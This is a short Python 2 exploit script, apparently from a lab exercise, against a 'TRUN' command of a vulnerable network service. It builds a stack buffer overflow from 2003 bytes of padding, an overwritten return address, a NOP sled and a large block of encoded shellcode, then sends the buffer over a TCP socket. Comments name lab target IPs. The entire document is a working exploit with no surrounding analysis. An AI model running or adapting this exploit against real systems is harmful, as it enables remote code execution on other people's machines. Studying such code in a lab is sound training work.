import socket
  2 buf = "TRUN /.:/"               #vulnerable function
  3 buf += "A" * 2003              #overflow: the 2003 is the value of the offset you found earlier, so update it.
  4 buf += '\xa0\x12\x50\x62'       #reverse byte order from EIP 
  5 buf += '\x90' * 30              #nop sled
  6 ##SHELLCODE##
  7 buf += b"\xb8\x0c\x3f\xf6\x37\xd9\xd0\xd9\x74\x24\xf4\x5f\x33"
  8 buf += b"\xc9\xb1\x52\x31\x47\x12\x83\xef\xfc\x03\x4b\x31\x14"
  9 buf += b"\xc2\xaf\xa5\x5a\x2d\x4f\x36\x3b\xa7\xaa\x07\x7b\xd3"
 10 buf += b"\xbf\x38\x4b\x97\xed\xb4\x20\xf5\x05\x4e\x44\xd2\x2a"
 11 buf += b"\xe7\xe3\x04\x05\xf8\x58\x74\x04\x7a\xa3\xa9\xe6\x43"
 12 buf += b"\x6c\xbc\xe7\x84\x91\x4d\xb5\x5d\xdd\xe0\x29\xe9\xab"
 13 buf += b"\x38\xc2\xa1\x3a\x39\x37\x71\x3c\x68\xe6\x09\x67\xaa"
 14 buf += b"\x09\xdd\x13\xe3\x11\x02\x19\xbd\xaa\xf0\xd5\x3c\x7a"
 15 buf += b"\xc9\x16\x92\x43\xe5\xe4\xea\x84\xc2\x16\x99\xfc\x30"
 16 buf += b"\xaa\x9a\x3b\x4a\x70\x2e\xdf\xec\xf3\x88\x3b\x0c\xd7"
 17 buf += b"\x4f\xc8\x02\x9c\x04\x96\x06\x23\xc8\xad\x33\xa8\xef"
 18 buf += b"\x61\xb2\xea\xcb\xa5\x9e\xa9\x72\xfc\x7a\x1f\x8a\x1e"
 19 buf += b"\x25\xc0\x2e\x55\xc8\x15\x43\x34\x85\xda\x6e\xc6\x55"
 20 buf += b"\x75\xf8\xb5\x67\xda\x52\x51\xc4\x93\x7c\xa6\x2b\x8e"
 21 buf += b"\x39\x38\xd2\x31\x3a\x11\x11\x65\x6a\x09\xb0\x06\xe1"
 22 buf += b"\xc9\x3d\xd3\xa6\x99\x91\x8c\x06\x49\x52\x7d\xef\x83"
 23 buf += b"\x5d\xa2\x0f\xac\xb7\xcb\xba\x57\x50\xfe\x08\x4c\x63"
 24 buf += b"\x96\x6e\x72\x76\xd4\xe6\x94\x12\x0a\xaf\x0f\x8b\xb3"
 25 buf += b"\xea\xdb\x2a\x3b\x21\xa6\x6d\xb7\xc6\x57\x23\x30\xa2"
 26 buf += b"\x4b\xd4\xb0\xf9\x31\x73\xce\xd7\x5d\x1f\x5d\xbc\x9d"
 27 buf += b"\x56\x7e\x6b\xca\x3f\xb0\x62\x9e\xad\xeb\xdc\xbc\x2f"
 28 buf += b"\x6d\x26\x04\xf4\x4e\xa9\x85\x79\xea\x8d\x95\x47\xf3"
 29 buf += b"\x89\xc1\x17\xa2\x47\xbf\xd1\x1c\x26\x69\x88\xf3\xe0"
 30 buf += b"\xfd\x4d\x38\x33\x7b\x52\x15\xc5\x63\xe3\xc0\x90\x9c"
 31 buf += b"\xcc\x84\x14\xe5\x30\x35\xda\x3c\xf1\x45\x91\x1c\x50"
 32 buf += b"\xce\x7c\xf5\xe0\x93\x7e\x20\x26\xaa\xfc\xc0\xd7\x49"
 33 buf += b"\x1c\xa1\xd2\x16\x9a\x5a\xaf\x07\x4f\x5c\x1c\x27\x5a"
 34 s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )            #create the socket
 35 s.connect(("localhost", 11120))                                   #win-ops IP: 10.50.33.133 #tgt-ip: 192.168.150.245
 36 print s.recv(1024)
 37 s.send(buf)
 38 print s.recv(1024)
 39 s.close()
